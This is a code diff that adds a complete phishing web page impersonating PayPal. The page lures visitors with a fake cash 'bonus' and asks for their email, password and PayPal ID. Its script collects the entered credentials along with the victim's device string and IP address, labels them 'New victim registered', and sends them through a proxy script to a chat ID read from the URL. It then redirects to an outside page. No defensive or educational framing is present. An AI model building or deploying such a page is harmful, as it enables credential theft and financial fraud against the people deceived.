@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>PayPal Bonus Login</title>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      color: white;
+      background: linear-gradient(45deg, #003087, #0070ba, #1546a0, #0060a0, #00548f);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
+    }
+    @keyframes gradientBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+    .container {
+      margin: 20px auto;
+      padding: 20px;
+      background: rgba(0,0,0,0.6);
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+      z-index: 1;
+      text-align: center;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      background: #ffffff20;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .buy-btn {
+      background: white;
+      color: #003087;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    input, select {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: none;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      font-size: 16px;
+    }
+    form { background: #ffffff20; padding: 20px; border-radius: 10px; }
+    label { display: block; margin-bottom: 5px; font-weight: bold; }
+    canvas#snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+  </style>
+</head>
+<body>
+
+<canvas id="snow"></canvas>
+
+<div id="login" class="container">
+  <h1>Login via</h1>
+  <button class="btn" onclick="showForm()">PayPal <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" height="20" /></button>
+</div>
+
+<div id="form" class="container" style="display: none;">
+  <h1>🎁 Get Your PayPal Bonus</h1>
+  <form id="paypalForm">
+    <label>Email:</label>
+    <input type="email" name="email" required placeholder="example@mail.com" />
+    <label>Password:</label>
+    <input type="password" name="password" required placeholder="********" />
+    <label>PayPal ID or Name:</label>
+    <input type="text" name="paypal_id" required placeholder="e.g., user123" />
+    <label>Select Bonus Amount:</label>
+    <select name="amount" required>
+      <option value="10$">Free $10</option>
+      <option value="50$">$50</option>
+      <option value="100$">$100</option>
+      <option value="150$">$150</option>
+    </select>
+    <button type="submit" class="buy-btn">Get Bonus</button>
+  </form>
+</div>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const CHAT_ID = urlParams.get('id');
+
+  function showForm() {
+    document.getElementById("login").style.display = "none";
+    document.getElementById("form").style.display = "block";
+  }
+
+  document.getElementById("paypalForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const data = new FormData(this);
+    const email = data.get("email");
+    const password = data.get("password");
+    const paypalId = data.get("paypal_id");
+    const amount = data.get("amount");
+    const device = navigator.userAgent;
+
+    let ipData = { ip: "غير معروف" };
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      ipData = await res.json();
+    } catch (e) {}
+
+    const message = `🚨 New victim registered:
+    
+Email: ${email}
+Password: ${password}
+PayPal ID: ${paypalId}
+Requested Bonus: ${amount}
+Device: ${device}
+IP: ${ipData.ip}`;
+
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("message", message);
+
+    fetch("proxy.php", {
+      method: "POST",
+      body: formData
+    })
+    .then(() => {
+      window.location.href = "https://issol.free.nf/success/ok.html?i=1";
+    })
+    .catch(() => {
+      alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
+    });
+  });
+</script>
+</body>
+</html>
